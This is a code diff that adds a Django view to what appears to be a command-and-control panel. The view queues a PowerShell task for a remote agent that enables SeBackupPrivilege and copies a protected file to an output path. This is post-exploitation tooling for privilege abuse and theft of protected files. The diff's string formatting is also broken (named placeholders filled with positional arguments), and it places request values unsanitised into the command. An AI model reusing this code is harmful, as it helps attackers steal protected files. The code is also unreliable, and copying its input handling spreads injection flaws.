@@ -740,3 +740,27 @@ def ACL_modify (request):
     else:
         return render(request, 'blog/listeners.html')
 
+
+def SeBackUpPrivelege (request):
+
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+
+        utilDLL_PATH = request.POST['utilDLL_PATH']
+        CmdLets_PATH = request.POST['CmdLets_PATH']        
+        FileToCopy = request.POST['FileToCopy']
+        outPut = request.POST['outPut']
+        task = "Import-Module .\{utilDLL_PATH};Import-Module .\{CmdLets_PATH};Set-SeBackupPrivilege;Copy-FileSeBackupPrivilege '{FileToCopy}' .\{outPut}".format(utilDLL_PATH,CmdLets_PATH,FileToCopy,outPut)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
+
+
